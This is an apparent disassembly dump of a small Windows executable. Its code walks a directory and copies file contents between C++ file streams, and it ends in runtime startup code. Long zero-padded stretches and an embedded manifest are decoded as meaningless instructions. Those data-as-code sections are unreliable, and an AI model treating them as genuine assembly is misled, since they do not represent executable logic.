add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
.byte 0x0




add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    $0x0,%al
add    %al,(%eax)
add    %al,(%eax)
add    %eax,(%eax)
sbb    %al,(%eax)
add    %al,(%eax)
sbb    %al,(%eax)
add    %al,0x0(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    $0x0,%al
add    %al,(%eax)
add    %al,(%eax)
add    %eax,(%eax)
add    %eax,(%eax)
add    %al,(%eax)
xor    %al,(%eax)
add    %al,0x0(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    $0x0,%al
add    %al,(%eax)
add    %al,(%eax)
add    %eax,(%eax)
or     %eax,(%eax,%eax,1)
add    %cl,0x0(%eax)
add    %al,(%eax)
pop    %eax
inc    %eax
add    %al,(%eax)
push   %esi
add    (%eax),%al
add    %ah,%ah
add    $0x0,%al
add    %al,(%eax)
add    %al,(%eax)
add    %bh,(%ecx,%eiz,2)
jae    0x4040cf
gs insl (%dx),%es:(%edi)
bound  %ebp,0x20(%ecx,%edi,2)
js     0x4040d1
insb   (%dx),%es:(%edi)
outsb  %ds:(%esi),(%dx)
jae    0x4040a5
and    0x72(%ebp),%dh
outsb  %ds:(%esi),(%dx)
cmp    0x63(%ebx),%dh
push   $0x73616d65
sub    $0x7263696d,%eax
outsl  %ds:(%esi),(%dx)
jae    0x4040eb
data16 je 0x4040ac
arpl   %bp,0x6d(%edi)
cmp    0x73(%ecx),%ah
insl   (%dx),%es:(%edi)
jbe,pn 0x4040ba
and    (%eax),%ah
insl   (%dx),%es:(%edi)
popa   
outsb  %ds:(%esi),(%dx)
imul   $0x65567473,0x65(%esi),%esp
jb     0x40410a
imul   $0x2e31223d,0x6e(%edi),%ebp
xor    %ah,(%edx)
ds or  $0x3c20200a,%eax
je     0x40411a
jne    0x40411d
je     0x4040f5
outsb  %ds:(%esi),(%dx)
outsw  %ds:(%esi),(%dx)
and    %bh,0x6d(%eax)
insb   (%dx),%es:(%edi)
outsb  %ds:(%esi),(%dx)
jae    0x4040f3
and    0x72(%ebp),%dh
outsb  %ds:(%esi),(%dx)
cmp    0x63(%ebx),%dh
push   $0x73616d65
sub    $0x7263696d,%eax
outsl  %ds:(%esi),(%dx)
jae    0x404139
data16 je 0x4040fa
arpl   %bp,0x6d(%edi)
cmp    0x73(%ecx),%ah
insl   (%dx),%es:(%edi)
jbe,pn 0x40410a
and    (%esi),%bh
or     $0x2020200a,%eax
and    %bh,(%ebx,%esi,2)
arpl   %si,%gs:0x72(%ebp)
imul   $0x20200a0d,0x3e(%ecx,%edi,2),%esi

and    %ah,(%eax)
and    %ah,(%eax)
cmp    $0x72,%al
gs jno 0x40416b
gs jae 0x40416d
gs fs push %eax
jb     0x404167
jbe    0x404169
insb   (%dx),%es:(%edi)
gs addr16 gs jae 0x404144
or     $0x2020200a,%eax
and    %ah,(%eax)
and    %ah,(%eax)
and    %bh,(%edx,%esi,2)
gs jno 0x40418a
gs jae 0x40418c
gs fs inc %ebp
js     0x404182
arpl   %si,0x74(%ebp)
imul   $0x6576654c,0x6e(%edi),%ebp
insb   (%dx),%es:(%edi)
and    %ch,0x76(%ebp,%eiz,2)
gs insb (%dx),%es:(%edi)
cmp    $0x49736122,%eax
outsb  %ds:(%esi),(%dx)
jbe    0x4041a5
imul   $0x22,0x72(%ebp),%esp
and    %dh,0x69(%ebp)
inc    %ecx
arpl   %sp,0x65(%ebx)
jae    0x4041b6
cmp    $0x6c616622,%eax
jae    0x4041af
and    (%esi),%bh
cmp    $0x2f,%al
jb     0x4041b5
jno    0x4041c7
gs jae 0x4041c9
gs fs inc %ebp
js     0x4041bf
arpl   %si,0x74(%ebp)
imul   $0x6576654c,0x6e(%edi),%ebp
insb   (%dx),%es:(%edi)
ds or  $0x2020200a,%eax
and    %ah,(%eax)
and    %bh,(%edi,%ebp,1)
jb     0x4041d7
jno    0x4041e9
gs jae 0x4041eb
gs fs push %eax
jb     0x4041e5
jbe    0x4041e7
insb   (%dx),%es:(%edi)
gs addr16 gs jae 0x4041c2
or     $0x2020200a,%eax
and    %bh,(%edi,%ebp,1)
jae    0x4041f3
arpl   %si,0x72(%ebp)
imul   $0x20200a0d,0x3e(%ecx,%edi,2),%esi

cmp    $0x2f,%al
je     0x40420f
jne    0x404212
je     0x4041ea
outsb  %ds:(%esi),(%dx)
outsw  %ds:(%esi),(%dx)
ds or  $0x3c20200a,%eax
fs gs jo 0x404213
outsb  %ds:(%esi),(%dx)
fs outsb %gs:(%esi),(%dx)
arpl   %di,0x3e(%ecx)
or     $0x2020200a,%eax
and    %bh,(%esp,%eiz,2)
gs jo  0x404225
outsb  %ds:(%esi),(%dx)
fs outsb %gs:(%esi),(%dx)
je     0x404207
jae    0x40423b
gs insl (%dx),%es:(%edi)
bound  %ebp,0x3e(%ecx,%edi,2)
or     $0x2020200a,%eax
and    %ah,(%eax)
and    %bh,(%ecx,%eiz,2)
jae    0x40424d
gs insl (%dx),%es:(%edi)
bound  %ebp,0x49(%ecx,%edi,2)
fs outsb %gs:(%esi),(%dx)
je     0x40424e
je     0x404260
and    %dh,0x70(%ecx,%edi,2)
gs cmp $0x6e697722,%eax
xor    (%edx),%esi
and    (%eax),%ah
outsb  %ds:(%esi),(%dx)
popa   
insl   (%dx),%es:(%edi)
gs cmp $0x63694d22,%eax
jb     0x40426f
jae    0x404271
data16 je 0x404233
push   %esi
inc    %ebx
cmp    %esi,(%eax)
cs inc %ebx
push   %edx
push   %esp
and    (%eax),%ah
jbe    0x404276
jb     0x404286
imul   $0x2e39223d,0x6e(%edi),%ebp
xor    %ch,(%esi)
xor    (%ecx),%dh
xor    %dh,(%edx)
xor    (%esi),%ch
cmp    %ah,(%edx)
and    %dh,0x72(%eax)
outsl  %ds:(%esi),(%dx)
arpl   %sp,0x73(%ebp)
jae    0x40429c
jb     0x404270
jb     0x404294
push   $0x63657469
je     0x4042ad
jb     0x40429f
cmp    $0x36387822,%eax
and    (%eax),%ah
jo     0x4042b8
bound  %ebp,0x63(%ecx,%ebp,2)
dec    %ebx
gs jns 0x40429f
outsl  %ds:(%esi),(%dx)
imul   $0x3d,0x6e(%ebp),%esp
and    (%ecx),%dh
data16 arpl %di,(%eax)
bound  %esi,(%ebx)
bound  %edi,(%ecx)
popa   
xor    %esp,0x31(%ebp)
cmp    %ah,0x33(%ebp)
bound  %esp,(%edx)
ds cmp $0x2f,%al
popa   
jae    0x4042db
gs insl (%dx),%es:(%edi)
bound  %ebp,0x49(%ecx,%edi,2)
fs outsb %gs:(%esi),(%dx)
je     0x4042dc
je     0x4042ee
ds or  $0x2020200a,%eax
and    %bh,(%edi,%ebp,1)
fs gs jo 0x4042e7
outsb  %ds:(%esi),(%dx)
fs outsb %gs:(%esi),(%dx)
je     0x4042c9
jae    0x4042fd
gs insl (%dx),%es:(%edi)
bound  %ebp,0x3e(%ecx,%edi,2)
or     $0x3c20200a,%eax
das    
fs gs jo 0x4042ff
outsb  %ds:(%esi),(%dx)
fs outsb %gs:(%esi),(%dx)
arpl   %di,0x3e(%ecx)
or     $0x612f3c0a,%eax
jae    0x40431b
gs insl (%dx),%es:(%edi)
bound  %ebp,0x3e(%ecx,%edi,2)
push   %eax
inc    %ecx




add    %dl,(%eax)
add    %al,(%eax)
xchg   %eax,%esp
add    %eax,(%eax)
add    %al,(%esi)
xor    %dl,(%eax,%esi,1)
sbb    $0x30,%al
xor    %al,%ss:0x30(%esi)
dec    %esp
xor    %ah,0x30(%eax)
jle    0x405048
nop
xor    %dl,-0x42cf52d0(%esi)
xor    %cl,%ch
xor    %bl,%dl
xor    %cl,(%ecx)
xor    %edx,0x26312131
xor    %edi,(%ebx)
xor    %eax,0x31(%edi)
dec    %ebp
xor    %esp,-0x49ce53cf(%ecx)
xor    %edx,%ecx
xor    %esp,%eax
xor    %ebp,%esp
xor    %esi,(%eax)
xor    0x32(%eax),%al
dec    %eax
xor    0x32(%esi),%cl
push   %esi
xor    0x64(%edx,%esi,1),%bl
xor    0x32(%edx),%ch
test   $0xbd32b432,%eax
xor    %bl,%al
xor    (%ebx),%cl
xor    0x33(%esi),%eax
popa   
xor    0x33(%edi),%esp
js     0x405093
(bad)  
xor    -0x54cc5acd(%eax),%ecx
xor    %eax,%ebp
xor    %edi,%edi
xor    0x34(%edi),%ebp
jle    0x4050a4
xorl   $0x34,-0x65cb6bcc(,%ecx,4)

lahf   
xor    $0xa4,%al
xor    $0xa9,%al
xor    $0xae,%al
xor    $0xb4,%al
xor    $0xbc,%al
xor    $0xd0,%al
xor    $0xeb,%al
xor    $0xf4,%al
xor    $0xf,%al
xor    $0x352c3519,%eax
ss xor $0x3540353b,%eax
bound  %esi,0x35703567
jne    0x4050d3
(bad)  
xor    $0x35993593,%eax
mov    0xb935b435,%al
xor    $0x35c735bf,%eax
int    $0x35
(bad)  
xor    $0x35e635e0,%eax
out    %eax,(%dx)
xor    $0x3616360e,%eax
pop    %ds
ss and $0x39362d36,%eax
ss dec %ebx
ss push %esi
ss pop %esp
movsl  %ss:(%esi),%es:(%edi)
ss stos %eax,%es:(%edi)
ss mov $0x36,%bl
mov    $0xc536bf36,%edx
ss lret 
ss (bad) 
fnstenv %ss:(%esi)
loopne 0x405114
out    %eax,$0x36
divl   (%esi)
pushl  (%esi)
add    $0x1c371137,%eax
aaa    
cmp    (%edi),%dh
inc    %eax
aaa    
inc    %esi
aaa    
dec    %esp
aaa    
push   %edx
aaa    
pop    %eax
aaa    
pop    %edi
aaa    
data16 aaa 
insl   (%dx),%es:(%edi)
aaa    
je     0x405135
jnp    0x405137
(bad)  
aaa    
mov    %esi,(%edi)
xchg   %eax,%ecx
aaa    
cltd   
aaa    
mov    0xb637ad37,%eax
aaa    
mov    $0xcb37c137,%ebx
aaa    
aam    $0x37
fbstp  (%edi)
jmp    0x405151
lock aaa 
add    %bh,(%eax)
add    $0x11380b38,%eax
cmp    %ah,(%edi)
cmp    %ch,(%esi)
cmp    %dh,0x38(%edi)
jge    0x405164
xchg   %bh,(%eax)
lea    (%eax),%edi
cwtl   
cmp    %bl,-0x38c74dc8(%esi)
cmp    %dl,%dl
cmp    %ch,%dl
cmp    %al,(%eax)
cmp    %ecx,0x4f394a39
cmp    %esi,0x39(%eax)
jne    0x405181
xchg   %eax,%esp
cmp    %edi,(%eax)
cmp    0x6d3a4f3a,%bh
cmp    -0xfc578c6(%ecx),%al
cmp    %dh,%dh
cmp    %ch,%bh
cmp    (%edx),%bl
cmp    0x3b(%edi),%esp
insb   (%dx),%es:(%edi)
cmp    -0x1ec42bc5(%ecx),%esi
cmp    %ebp,%ebp
cmp    %ebp,%esi
cmp    %ebp,%edi
cmp    (%ecx),%ecx
cmp    $0x2d,%al
cmp    $0x35,%al
cmp    $0x40,%al
cmp    $0x46,%al
cmp    $0x4c,%al
cmp    $0x52,%al
cmp    $0x58,%al
cmp    $0x5e,%al
cmp    $0x64,%al
cmp    $0x6a,%al
cmp    $0x70,%al
cmp    $0x8c,%al
cmp    $0xbf,%al
cmp    $0x8,%al
cmp    $0x3d2d3d14,%eax
cmp    0x20003d5b,%edi
add    %al,(%eax)
sub    $0x0,%al
add    %al,(%eax)
add    $0x31,%al
adc    %dh,(%ecx)
adc    $0x31,%al
cmp    $0x31,%al
inc    %eax
xor    %esp,0x346433a8(%ebx,%esi,1)
push   $0xa4348834
xor    $0xa8,%al
xor    $0xb0,%al
xor    $0xb8,%al
xor    $0xc4,%al
xor    $0xe4,%al
xor    $0xf0,%al
xor    $0x0,%al
add    %al,(%eax)
xor    %al,(%eax)
add    %cl,(%eax,%eax,1)
add    %al,(%eax)
sbb    %dh,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)







mov    $0x104,%ecx
push   %edi
mov    %ecx,%edi
xor    %eax,%eax
cmp    %ax,(%edx)
je     0x401014
inc    %edx
inc    %edx
dec    %edi
jne    0x40100a
test   %edi,%edi
jne    0x40101d
mov    $0x80070057,%eax
test   %esi,%esi
je     0x40102e
test   %eax,%eax
jl     0x40102b
sub    %edi,%ecx
mov    %ecx,(%esi)
pop    %edi
ret    
andl   $0x0,(%esi)
pop    %edi
ret    
push   %esi
push   %edi
mov    %eax,%edi
mov    %ecx,%esi
xor    %eax,%eax
cmp    %eax,%esi
je     0x40105e
cmp    %eax,0xc(%esp)
je     0x40105a
movzwl (%edi),%ecx
cmp    %ax,%cx
je     0x40105a
mov    %cx,(%edx)
inc    %edx
inc    %edx
inc    %edi
inc    %edi
dec    %esi
decl   0xc(%esp)
cmp    %eax,%esi
jne    0x40103c
cmp    %eax,%esi
jne    0x401065
dec    %edx
dec    %edx
mov    $0x8007007a,%eax
xor    %ecx,%ecx
pop    %edi
mov    %cx,(%edx)
pop    %esi
ret    $0x4
push   $0x11c
mov    $0x401db3,%eax
call   0x401d54
pushl  0xc(%ebp)
mov    0x4020e4,%esi
pushl  0x8(%ebp)
push   $0x402154
call   *%esi
add    $0xc,%esp
push   $0x1
push   $0x40
push   $0x20
pushl  0x8(%ebp)
lea    -0xa0(%ebp),%ecx
call   *0x402064
xor    %edi,%edi
mov    %edi,-0x4(%ebp)
cmp    %edi,-0x4c(%ebp)
jne    0x4010dc
call   *0x402014
push   %eax
push   $0x402168
call   *%esi
orl    $0xffffffff,-0x4(%ebp)
pop    %ecx
pop    %ecx
lea    -0xa0(%ebp),%ecx
call   *0x402050
xor    %eax,%eax
inc    %eax
call   0x401d87
ret    
push   $0x1
push   $0x40
push   $0x20
pushl  0xc(%ebp)
lea    -0x128(%ebp),%ecx
call   *0x40206c
movb   $0x1,-0x4(%ebp)
cmp    %edi,-0xd8(%ebp)
jne    0x40114d
call   *0x402014
push   %eax
push   $0x40218c
call   *%esi
xor    %edi,%edi
pop    %ecx
inc    %edi
pop    %ecx
lea    -0x128(%ebp),%ecx
movb   $0x0,-0x4(%ebp)
call   *0x402054
orl    $0xffffffff,-0x4(%ebp)
lea    -0xa0(%ebp),%ecx
call   *0x402050
mov    %edi,%eax
jmp    0x4010d6
lea    -0xa0(%ebp),%ecx
call   *0x402060
push   %eax
lea    -0x128(%ebp),%ecx
call   *0x402058
mov    -0xa0(%ebp),%eax
mov    0x4(%eax),%eax
lea    -0xa0(%ebp,%eax,1),%eax
mov    0x8(%eax),%ecx
and    $0x6,%cl
movsbl %cl,%ecx
neg    %ecx
sbb    %ecx,%ecx
not    %ecx
test   %ecx,%eax
jne    0x401134
lea    -0x128(%ebp),%ecx
call   *0x40205c
lea    -0xa0(%ebp),%ecx
call   *0x402068
lea    -0x128(%ebp),%ecx
call   *0x402070
push   $0x4021b0
call   *%esi
jmp    0x40110f
push   %ebp
mov    %esp,%ebp
sub    $0x480,%esp
mov    0x403000,%eax
xor    %ebp,%eax
mov    %eax,-0x8(%ebp)
mov    0x8(%ebp),%eax
push   %ebx
push   %esi
push   %edi
mov    %ecx,%ebx
xor    %edi,%edi
mov    %ebx,-0x474(%ebp)
mov    %eax,-0x470(%ebp)
cmp    %edi,%ebx
je     0x4011dc
lea    -0x468(%ebp),%esi
mov    %ebx,%edx
call   0x401000
jmp    0x4011e1
mov    $0x80070057,%eax
cmp    %edi,%eax
jge    0x4011eb
mov    %edi,-0x468(%ebp)
cmpl   $0x101,-0x468(%ebp)

jbe    0x401208
push   $0x4021c4
call   *0x4020e0
pop    %ecx
jmp    0x4013d8
push   %ebx
push   $0x402200
call   *0x4020e0
pop    %ecx
pop    %ecx
mov    %ebx,%eax
mov    $0x104,%ebx
push   $0x7ffffffe
mov    %ebx,%ecx
lea    -0x214(%ebp),%edx
call   0x401030
lea    -0x46c(%ebp),%esi
lea    -0x214(%ebp),%edx
call   0x401000
cmp    %edi,%eax
jl     0x401264
mov    -0x46c(%ebp),%eax
mov    %ebx,%ecx
sub    %eax,%ecx
lea    -0x214(%ebp,%eax,2),%edx
push   $0x7fffffff
mov    $0x402234,%eax
call   0x401030
lea    -0x464(%ebp),%eax
push   %eax
lea    -0x214(%ebp),%eax
push   %eax
call   *0x402010
mov    %eax,-0x46c(%ebp)
cmp    $0xffffffff,%eax
jne    0x401293
push   $0x402244
call   *0x4020e4
jmp    0x401202
mov    0x4020dc,%ebx
pushl  -0x448(%ebp)
mov    -0x444(%ebp),%eax
push   %eax
lea    -0x438(%ebp),%eax
push   %eax
push   $0x40225c
call   *0x4020e0
push   %edi
pushl  -0x470(%ebp)
push   %edi
call   *%ebx
lea    0x1(%eax),%esi
add    $0x1c,%esp
push   %esi
call   0x40155a
pop    %ecx
push   %esi
pushl  -0x470(%ebp)
mov    %eax,-0x478(%ebp)
push   %eax
call   *%ebx
add    $0xc,%esp
push   %edi
pushl  -0x474(%ebp)
push   %edi
call   *%ebx
lea    0x1(%eax),%esi
add    $0xc,%esp
push   %esi
call   0x40155a
pop    %ecx
push   %esi
pushl  -0x474(%ebp)
mov    %eax,-0x468(%ebp)
push   %eax
call   *%ebx
add    $0xc,%esp
push   %edi
lea    -0x438(%ebp),%eax
push   %eax
push   %edi
call   *%ebx
lea    0x1(%eax),%esi
add    $0xc,%esp
push   %esi
call   0x40155a
pop    %ecx
push   %esi
lea    -0x438(%ebp),%ecx
push   %ecx
push   %eax
mov    %eax,-0x47c(%ebp)
call   *%ebx
mov    -0x468(%ebp),%edi
add    $0xc,%esp
dec    %edi
mov    0x1(%edi),%al
inc    %edi
test   %al,%al
jne    0x40133f
mov    -0x47c(%ebp),%eax
mov    $0x402280,%esi
movsw  %ds:(%esi),%es:(%edi)
mov    %eax,%esi
mov    (%eax),%cl
inc    %eax
test   %cl,%cl
jne    0x401356
mov    -0x468(%ebp),%edi
sub    %esi,%eax
dec    %edi
mov    0x1(%edi),%cl
inc    %edi
test   %cl,%cl
jne    0x401366
pushl  -0x468(%ebp)
mov    %eax,%ecx
pushl  -0x478(%ebp)
shr    $0x2,%ecx
rep movsl %ds:(%esi),%es:(%edi)
mov    %eax,%ecx
and    $0x3,%ecx
rep movsb %ds:(%esi),%es:(%edi)
call   0x40106f
pop    %ecx
pop    %ecx
test   %eax,%eax
je     0x4013b1
lea    -0x464(%ebp),%eax
push   %eax
pushl  -0x46c(%ebp)
call   *0x40200c
test   %eax,%eax
je     0x4013b5
xor    %edi,%edi
jmp    0x401299
xor    %eax,%eax
jmp    0x4013db
call   *0x402014
cmp    $0x12,%eax
je     0x4013cc
push   $0x402284
call   *0x4020e4
pop    %ecx
pushl  -0x46c(%ebp)
call   *0x402008
xor    %eax,%eax
inc    %eax
mov    -0x8(%ebp),%ecx
pop    %edi
pop    %esi
xor    %ebp,%ecx
pop    %ebx
call   0x40154b
leave  
ret    
push   %ebp
mov    %esp,%ebp
and    $0xfffffff8,%esp
sub    $0xc,%esp
push   %ebx
push   %esi
push   %edi
push   $0x2
xor    %ecx,%ecx
pop    %ebx
mov    $0x7fff,%eax
mov    %eax,0x10(%esp)
mov    %ebx,%edx
mul    %edx
seto   %cl
neg    %ecx
or     %eax,%ecx
push   %ecx
call   0x40155a
mov    %eax,%esi
pop    %ecx
lea    0x10(%esp),%eax
push   %eax
push   %esi
mov    %esi,0x1c(%esp)
call   *0x402000
test   %eax,%eax
jne    0x401440
push   $0x402294
call   *0x4020e4
xor    %eax,%eax
pop    %ecx
inc    %eax
jmp    0x401537
push   %esi
push   $0x4022b4
call   *0x4020e0
pop    %ecx
mov    %esi,%eax
pop    %ecx
lea    0x2(%eax),%edx
mov    (%eax),%cx
add    %ebx,%eax
test   %cx,%cx
jne    0x401453
sub    %edx,%eax
xor    %ecx,%ecx
sar    %eax
mov    %ebx,%edx
mul    %edx
seto   %cl
neg    %ecx
or     %eax,%ecx
push   %ecx
call   0x40155a
mov    $0x4022d4,%esi
movl   $0x208,(%esp)
call   0x40155a
pop    %ecx
mov    %eax,%edi
movzwl (%esi),%ecx
mov    %cx,(%eax)
add    %ebx,%esi
add    %ebx,%eax
test   %cx,%cx
jne    0x401488
mov    0x14(%esp),%eax
mov    %eax,%edx
mov    (%eax),%cx
add    %ebx,%eax
test   %cx,%cx
jne    0x40149d
sub    %edx,%eax
dec    %edi
dec    %edi
mov    %edx,%esi
lea    0x2(%edi),%edx
mov    0x2(%edi),%cx
add    %ebx,%edi
test   %cx,%cx
jne    0x4014b0
mov    %eax,%ecx
shr    $0x2,%ecx
rep movsl %ds:(%esi),%es:(%edi)
mov    %eax,%ecx
and    $0x3,%ecx
dec    %edx
dec    %edx
rep movsb %ds:(%esi),%es:(%edi)
lea    0x2(%edx),%ebx
mov    0x2(%edx),%ax
inc    %edx
inc    %edx
test   %ax,%ax
jne    0x4014ce
push   $0xe
pop    %ecx
mov    %edx,%edi
mov    $0x40230c,%esi
rep movsl %ds:(%esi),%es:(%edi)
push   $0x0
movsw  %ds:(%esi),%es:(%edi)
mov    0x4020dc,%esi
push   %ebx
push   $0x0
call   *%esi
lea    0x1(%eax),%edi
add    $0xc,%esp
push   %edi
call   0x40155a
pop    %ecx
push   %edi
push   %ebx
push   %eax
call   *%esi
mov    0x8(%ebp),%esi
add    $0xc,%esp
pushl  (%esi)
mov    %ebx,%ecx
call   0x4011a0
pop    %ecx
test   %eax,%eax
je     0x401535
pushl  (%esi)
mov    $0x402348,%ecx
call   0x4011a0
pop    %ecx
test   %eax,%eax
je     0x401535
push   $0x4023c8
jmp    0x401431
xor    %eax,%eax
pop    %edi
pop    %esi
pop    %ebx
mov    %ebp,%esp
pop    %ebp
ret    
pushl  0x8(%esp)
call   0x4013ea
pop    %ecx
xor    %eax,%eax
ret    
cmp    0x403000,%ecx
jne    0x401555
repz ret 
jmp    0x40180c
jmp    *0x4020e8
push   $0x401a4a
call   0x401a0d
mov    0x40336c,%eax
movl   $0x403034,(%esp)
pushl  0x403368
mov    %eax,0x403034
push   $0x403024
push   $0x403028
push   $0x403020
call   *0x4020d4
add    $0x14,%esp
mov    %eax,0x403030
test   %eax,%eax
jge    0x4015aa
push   $0x8
call   0x401962
pop    %ecx
ret    
push   $0x10
push   $0x4024e8
call   0x401bdc
xor    %ebx,%ebx
mov    %ebx,-0x4(%ebp)
mov    %fs:0x18,%eax
mov    0x4(%eax),%esi
mov    %ebx,-0x1c(%ebp)
mov    $0x403384,%edi
push   %ebx
push   %esi
push   %edi
call   *0x40203c
cmp    %ebx,%eax
je     0x4015f3
cmp    %esi,%eax
jne    0x4015e6
xor    %esi,%esi
inc    %esi
mov    %esi,-0x1c(%ebp)
jmp    0x4015f6
push   $0x3e8
call   *0x402040
jmp    0x4015cd
xor    %esi,%esi
inc    %esi
mov    0x403380,%eax
cmp    %esi,%eax
jne    0x401609
push   $0x1f
call   0x401962
pop    %ecx
jmp    0x401644
mov    0x403380,%eax
test   %eax,%eax
jne    0x40163e
mov    %esi,0x403380
push   $0x402110
push   $0x402104
call   0x401bd4
pop    %ecx
pop    %ecx
test   %eax,%eax
je     0x401644
movl   $0xfffffffe,-0x4(%ebp)
mov    $0xff,%eax
jmp    0x40171b
mov    %esi,0x40303c
mov    0x403380,%eax
cmp    %esi,%eax
jne    0x401668
push   $0x402100
push   $0x4020f8
call   0x401bce
pop    %ecx
pop    %ecx
movl   $0x2,0x403380

cmp    %ebx,-0x1c(%ebp)
jne    0x401675
push   %ebx
push   %edi
call   *0x402044
cmp    %ebx,0x403390
je     0x401696
push   $0x403390
call   0x401b10
pop    %ecx
test   %eax,%eax
je     0x401696
push   %ebx
push   $0x2
push   %ebx
call   *0x403390
mov    0x403024,%eax
mov    0x4020c0,%ecx
mov    %eax,(%ecx)
pushl  0x403024
pushl  0x403028
pushl  0x403020
call   0x40153e
add    $0xc,%esp
mov    %eax,0x403038
cmp    %ebx,0x40302c
jne    0x401701
push   %eax
call   *0x4020c4
mov    -0x14(%ebp),%eax
mov    (%eax),%ecx
mov    (%ecx),%ecx
